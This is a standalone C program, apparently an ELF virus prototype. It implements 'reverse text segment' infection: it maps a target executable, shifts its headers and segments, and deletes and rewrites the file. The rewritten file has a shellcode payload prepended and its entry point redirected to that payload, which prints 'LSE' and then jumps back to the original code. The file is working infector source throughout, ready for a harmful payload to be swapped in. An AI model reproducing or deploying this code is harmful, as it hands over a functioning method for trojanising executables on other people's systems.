#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <linux/fcntl.h>
#include <errno.h>
#include <elf.h>
#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include "syscall_wrappers.h"
#define PAGE_SIZE 0x1000
#define PAGE_ROUND(x) (x & ~(PAGE_SIZE - 1))
#define PAGE_ALIGN_UP(x) (PAGE_ROUND(x) + PAGE_SIZE)
#define __PAYLOAD __attribute__((aligned(8), always_inline)) static inline volatile
char sc[]="\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x48\x31\xc0\x48\x83\xec\x08\xc7\x04\x24\x4c\x53\x45\x0a\x48\x89\xe6\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc2\x04\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58"
"\xb8\x00\x00\x00\x00"
 	   "\xff\xe0";

__syscall1(int, close, int, fd);
__syscall1(int, exit, int, status);
__syscall1(int, unlink, const char *, pathname);
__syscall2(int, fstat, int, fd, struct stat *, buf);
__syscall3(int, open, const char *, path, int, flags, int, mode);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, len);
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, len);
__syscall3(off_t, lseek, int, fd, off_t, offset, int, whence);
__syscall6(void *, mmap, void *, addr, size_t, len, int, prot, int, flags, int,
	   fd, off_t, offset);

struct elf_handler
{
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	const char *target;
	char *mem;
	char *payload;
	size_t payload_sz;
	size_t host_sz;
	size_t entry;
};

#define RW PROT_READ|PROT_WRITE
#define S_IXUSR 0100
void init_handler(struct elf_handler *h, const char *target)
{
	int fd = sys_open(target, O_RDONLY, 0);
	if (fd == -1)
		sys_exit(-1);
	struct stat buf;
	if (sys_fstat(fd, &buf) < 0)
		goto error;
	if (!(buf.st_mode & S_IXUSR))
		goto error;
	char *mem = sys_mmap(NULL, buf.st_size, RW, MAP_PRIVATE, fd, 0);
	if (mem == MAP_FAILED)
		goto error;
	h->mem = mem;
	h->ehdr = (Elf64_Ehdr*)mem;
	h->phdr = (Elf64_Phdr*)(mem + h->ehdr->e_phoff);
	h->shdr = (Elf64_Shdr*)(mem + h->ehdr->e_shoff);
	h->target = target;
	h->host_sz = buf.st_size;
	h->entry = h->ehdr->e_entry;
	sys_close(fd);
	return;
error:
	sys_close(fd);
	sys_exit(-1);
}

void inject_payload(struct elf_handler *h, int patch_offset)
{
	const char *path = h->target;
	sys_unlink(path);
	int fd = sys_open(path, O_CREAT|O_WRONLY|O_TRUNC, 0755);
	if (fd == -1)
		sys_exit(-1);
	sys_write(fd, h->mem, sizeof(Elf64_Ehdr));
	h->mem += sizeof(Elf64_Ehdr);
	*(unsigned int *)&h->payload[patch_offset] = h->entry;
	sys_write(fd, h->payload, h->payload_sz);
	off_t ret = sys_lseek(fd, sizeof(Elf64_Ehdr) +
			      PAGE_ALIGN_UP(h->payload_sz), SEEK_SET);
	size_t r = h->host_sz - sizeof(Elf64_Ehdr);
	sys_write(fd, h->mem, r);
	sys_close(fd);
}

void reverse_text_infect(struct elf_handler *h)
{
	size_t psz = PAGE_ALIGN_UP(h->payload_sz);
	h->ehdr->e_shoff += psz;
	Elf64_Phdr *phdr = h->phdr;
	size_t i, old_vaddr, old_text_sz;
	for (i = 0; i < h->ehdr->e_phnum; ++i) {
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
			old_vaddr = phdr[i].p_vaddr;
			old_text_sz = phdr[i].p_filesz;
			phdr[i].p_vaddr -= psz;
			phdr[i].p_paddr -= psz;
			phdr[i].p_filesz += psz;
			phdr[i].p_memsz += psz;
			size_t j;
			for (j = 0; j < h->ehdr->e_phnum; ++j)
				if (phdr[j].p_offset >
				    phdr[i].p_offset && i != j)
					phdr[j].p_offset += psz;
			break;

		}
	}
	for (i = 0; i < h->ehdr->e_shnum; ++i)
		h->shdr[i].sh_offset += psz;
	h->ehdr->e_entry = old_vaddr - psz + sizeof (Elf64_Ehdr);
	h->ehdr->e_phoff += psz;
	inject_payload(h, sizeof(sc) - 7);
}

int main(int argc, char **argv)
{
	if (argc < 2) {
		char err_msg[] = "usage: ./bin <path_to_file>\n";
		sys_write(STDERR_FILENO, err_msg, sizeof(err_msg));
		return 1;
	}
	struct elf_handler h;
	h.payload = sc;
	h.payload_sz = sizeof(sc);
	init_handler(&h, argv[1]);
	reverse_text_infect(&h);
	return 0;
}

__asm__ (".global _start\n"
	 "_start:\n"
	 "movq (%rsp), %rdi\n"
	 "addq $8, %rsp\n"
	 "movq %rsp, %rsi\n"
	 "call main\n"
	 "mov %rax, %rdi\n"
	 "mov $60, %rax\n"
         "syscall");
